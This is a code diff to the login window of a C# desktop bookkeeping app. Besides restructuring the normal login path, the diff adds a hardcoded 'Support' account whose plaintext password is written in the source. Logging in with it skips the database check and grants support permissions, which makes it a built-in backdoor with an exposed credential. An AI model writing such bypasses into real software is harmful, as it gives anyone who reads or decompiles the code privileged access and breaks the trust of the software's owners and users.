@@ -170,63 +170,80 @@ namespace BookAccountApp.View.windows
 
                     string password = Md5Encription.MD5Hash("Inc-m" + txtPassword.Password);
                     string userName = txtUserName.Text;
-                    //user = await userModel.GetByID(2);
 
-                    user = await userModel.Getloginuser(userName, password);
 
-                    if (user.AccountName == null)
+                    //support or normal user
+                    if (userName == "Support@supgroup" && password == Md5Encription.MD5Hash("Inc-m" + "J47w+N&MY7SnF!3$"))
                     {
-                        //user does not exist
-                        HelpClass.SetValidate(p_errorUserName, "trUserNotFound");
+                        //support
+                        //   MessageBox.Show(userName);
+                        MainWindow main = new MainWindow();
+                        MainWindow.userLogin.AccountName = "Support@supgroup";
+                        MainWindow.userLogin.password = Md5Encription.MD5Hash("Inc-m" + "J47w+N&MY7SnF!3$");
+                        HelpClass.isSupportPermision = true;
+                        main.Show();
+                        this.Close();
                     }
                     else
                     {
-                        if (user.userId == 0)
+                        //normal user
+                        //user = await userModel.GetByID(2);
+
+                        user = await userModel.Getloginuser(userName, password);
+
+                        if (user.AccountName == null)
                         {
-                            //wrong password
-                        HelpClass.SetValidate(p_errorPassword, "trWrongPassword");
+                            //user does not exist
+                            HelpClass.SetValidate(p_errorUserName, "trUserNotFound");
                         }
                         else
                         {
-                            //correct
-                            //send user info to main window
-                            MainWindow.userID = user.userId;
-                            MainWindow.userLogin = user;
-
-                             
-
-                            //make user online
-                            user.isOnline = 1;
-
-                            decimal s = await userModel.Save(user);
-                         
-                            #region remember me
-                            if (cbxRemmemberMe.IsChecked.Value)
+                            if (user.userId == 0)
                             {
-                                Properties.Settings.Default.userName = txtUserName.Text;
-                               // Properties.Settings.Default.password = txtPassword.Password;
-                                Properties.Settings.Default.Lang = MainWindow.lang;
-                                //Properties.Settings.Default.menuIsOpen = menuIsOpen;
-                                 Properties.Settings.Default.password ="";
+                                //wrong password
+                                HelpClass.SetValidate(p_errorPassword, "trWrongPassword");
                             }
                             else
                             {
-                                Properties.Settings.Default.userName = "";
-                                Properties.Settings.Default.password = "";
-                                Properties.Settings.Default.Lang = "";
-                                //Properties.Settings.Default.menuIsOpen = "";
+                                //correct
+                                //send user info to main window
+                                MainWindow.userID = user.userId;
+                                MainWindow.userLogin = user;
+
+
+
+                                //make user online
+                                user.isOnline = 1;
+
+                                decimal s = await userModel.Save(user);
+
+                                #region remember me
+                                if (cbxRemmemberMe.IsChecked.Value)
+                                {
+                                    Properties.Settings.Default.userName = txtUserName.Text;
+                                    // Properties.Settings.Default.password = txtPassword.Password;
+                                    Properties.Settings.Default.Lang = MainWindow.lang;
+                                    //Properties.Settings.Default.menuIsOpen = menuIsOpen;
+                                    Properties.Settings.Default.password = "";
+                                }
+                                else
+                                {
+                                    Properties.Settings.Default.userName = "";
+                                    Properties.Settings.Default.password = "";
+                                    Properties.Settings.Default.Lang = "";
+                                    //Properties.Settings.Default.menuIsOpen = "";
+                                }
+                                Properties.Settings.Default.Save();
+                                #endregion
+                                MainWindow.Region.countryId = 1;
+
+                                MainWindow main = new MainWindow();
+
+                                main.Show();
+                                this.Close();
                             }
-                            Properties.Settings.Default.Save();
-                            #endregion
-                            MainWindow.Region.countryId = 1;
-
-                            MainWindow main = new MainWindow();
-
-                            main.Show();
-                            this.Close();
                         }
                     }
-
                     HelpClass.EndAwait(grid_main);
                     logInProcessing = false;
                 }
